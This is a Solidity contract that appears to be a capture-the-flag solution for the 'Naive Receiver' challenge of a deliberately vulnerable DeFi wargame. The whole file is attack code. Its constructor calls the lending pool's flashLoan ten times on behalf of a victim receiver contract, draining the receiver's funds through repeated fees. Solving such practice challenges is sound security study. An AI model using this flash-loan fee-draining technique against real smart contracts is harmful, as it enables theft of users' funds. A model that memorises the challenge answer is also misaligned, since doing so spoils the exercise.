// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {

  constructor(address pool, address receiver) {
    for (int i = 0; i < 10; i++) {
      NaiveReceiverLenderPool(payable(pool)).flashLoan(receiver, 1 ether);
    }
  }

}